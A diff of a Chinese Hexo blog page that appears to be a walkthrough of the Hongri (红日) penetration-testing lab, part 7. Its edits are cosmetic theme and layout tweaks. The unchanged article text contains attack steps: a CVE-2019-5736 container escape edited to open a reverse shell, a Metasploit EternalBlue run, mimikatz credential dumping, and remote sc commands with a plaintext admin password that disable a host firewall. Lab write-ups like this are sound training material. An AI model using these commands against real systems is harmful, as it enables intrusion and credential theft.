@@ -1,7 +1,7 @@
 
 
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
+<html lang="zh-CN" data-default-color-scheme=dark>
 
 
 
@@ -123,7 +123,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"😒","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -196,18 +196,6 @@
             </li>
           
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
         
           <li class="nav-item" id="search-btn">
             <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
@@ -253,7 +241,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.6k 字
+      2.6k 个字
     </span>
   
 
@@ -375,7 +363,7 @@
 <p><strong>连接成功</strong></p>
 <p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235045993.png" srcset="/img/loading.gif" lazyload alt="image-20240610235045993"></p>
 <p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235051963.png" srcset="/img/loading.gif" lazyload alt="image-20240610235051963"></p>
-<h3 id="第二种方法，绕过-docker"><a href="#第二种方法，绕过-docker" class="headerlink" title="第二种方法，绕过****docker"></a><strong>第二种方法，绕过****docker</strong></h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs subunit">使用cve<span class="hljs-string">-2019</span><span class="hljs-string">-5736</span><br><br>该漏洞（CVE<span class="hljs-string">-2019</span><span class="hljs-string">-5736</span>）是2019年爆出的。在Docker 18.09.2之前的版本中使用的runc版本小于1.0-rc6，其允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。<br><br>利用该漏洞需要满足以下两个条件之一：<br><br>- •由一个攻击者控制的恶意镜像创建•攻击者具有某已存在容器的写权限，且可通过docker     exec进入。<br><br>首先下载攻击脚本： https://github.com/Frichetten/CVE<span class="hljs-string">-2019</span><span class="hljs-string">-5736</span>-PoC<br><br>打开main.go脚本，将脚本中要在目标机上执行的命令修改为反弹shell的命令，IP为攻击机IP，端口为攻击机监听的端口：<br></code></pre></td></tr></table></figure>
+<h3 id="第二种方法，绕过-docker"><a href="#第二种方法，绕过-docker" class="headerlink" title="第二种方法，绕过****docker"></a><strong>第二种方法，绕过****docker</strong></h3><figure class="highlight subunit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs subunit">使用cve<span class="hljs-string">-2019</span><span class="hljs-string">-5736</span><br><br>该漏洞（CVE<span class="hljs-string">-2019</span><span class="hljs-string">-5736</span>）是2019年爆出的。在Docker 18.09.2之前的版本中使用的runc版本小于1.0-rc6，其允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。<br><br>利用该漏洞需要满足以下两个条件之一：<br><br>- •由一个攻击者控制的恶意镜像创建•攻击者具有某已存在容器的写权限，且可通过docker     exec进入。<br><br>首先下载攻击脚本： https://github.com/Frichetten/CVE<span class="hljs-string">-2019</span><span class="hljs-string">-5736</span>-PoC<br><br>打开main.go脚本，将脚本中要在目标机上执行的命令修改为反弹shell的命令，IP为攻击机IP，端口为攻击机监听的端口：<br></code></pre></div></td></tr></table></figure>
 
 <h3 id="特权模式绕过"><a href="#特权模式绕过" class="headerlink" title="特权模式绕过"></a>特权模式绕过</h3><p>挂载过去</p>
 <p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235152702.png" srcset="/img/loading.gif" lazyload alt="image-20240610235152702"></p>
@@ -405,7 +393,7 @@
 <p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000337717.png" srcset="/img/loading.gif" lazyload alt="image-20240611000337717"></p>
 <p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000342119.png" srcset="/img/loading.gif" lazyload alt="image-20240611000342119"></p>
 <p>也可以使用永恒之蓝拿下30</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhost 192.168.52.30<br><span class="hljs-built_in">set</span> RPORT 445<br><span class="hljs-built_in">set</span> lport 8526<br>setg Proxies socks5:127.0.0.1:9999<br>setg ReverseAllowProxy <span class="hljs-literal">true</span><br>run<br></code></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhost 192.168.52.30<br><span class="hljs-built_in">set</span> RPORT 445<br><span class="hljs-built_in">set</span> lport 8526<br>setg Proxies socks5:127.0.0.1:9999<br>setg ReverseAllowProxy <span class="hljs-literal">true</span><br>run<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000818403.png" srcset="/img/loading.gif" lazyload alt="image-20240611000818403"></p>
 <p>内网信息</p>
@@ -415,13 +403,13 @@
 <p>这里有一个问题，就是使用load kiwi的时候执行这些命令报错的话，<strong>将其注入到其他进程中</strong></p>
 <p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000848264.png" srcset="/img/loading.gif" lazyload alt="image-20240611000848264"></p>
 <p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000939978.png" srcset="/img/loading.gif" lazyload alt="image-20240611000939978"></p>
-<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">load kiwi<br>kiwi_cmd privilege::debug<br>kiwi_cmd sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure>
+<figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino">load kiwi<br>kiwi_cmd privilege::debug<br>kiwi_cmd sekurlsa::logonPasswords<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001045161.png" srcset="/img/loading.gif" lazyload alt="image-20240611001045161"></p>
 <p>密码，包括域控制器的，域开启着防火墙，将其关闭</p>
 <p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001100498.png" srcset="/img/loading.gif" lazyload alt="image-20240611001100498"></p>
 <p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001121934.png" srcset="/img/loading.gif" lazyload alt="image-20240611001121934"></p>
-<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> [\\192.168.93.30\ipc$](<span class="hljs-keyword">file</span>:<span class="hljs-comment">//192.168.93.30/ipc$) &quot;Whoami2021&quot; /user:&quot;Administrator&quot;</span><br><br><span class="hljs-keyword">sc</span> [\\192.168.93.30](<span class="hljs-keyword">file</span>:<span class="hljs-comment">//192.168.93.30) create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><br><span class="hljs-keyword">sc</span> [\\192.168.93.30](<span class="hljs-keyword">file</span>:<span class="hljs-comment">//192.168.93.30) start unablefirewall</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> [\\192.168.93.30\ipc$](<span class="hljs-keyword">file</span>:<span class="hljs-comment">//192.168.93.30/ipc$) &quot;Whoami2021&quot; /user:&quot;Administrator&quot;</span><br><br><span class="hljs-keyword">sc</span> [\\192.168.93.30](<span class="hljs-keyword">file</span>:<span class="hljs-comment">//192.168.93.30) create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><br><span class="hljs-keyword">sc</span> [\\192.168.93.30](<span class="hljs-keyword">file</span>:<span class="hljs-comment">//192.168.93.30) start unablefirewall</span><br></code></pre></div></td></tr></table></figure>
 
 <p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001135466.png" srcset="/img/loading.gif" lazyload alt="image-20240611001135466"></p>
 <p>关闭防火墙成功</p>
@@ -451,29 +439,6 @@
                 
               </div>
               
-              
-                <div class="post-prevnext">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CFS三层靶机</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2024/06/10/%E7%BA%A2%E6%97%A55/">
-                        <span class="hidden-mobile">红日靶场（5）</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
               
             </div>
 
@@ -534,7 +499,8 @@
 
   <footer class="text-center mt-5 py-3">
   <div class="footer-content">
-     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    
+
   </div>
   
 
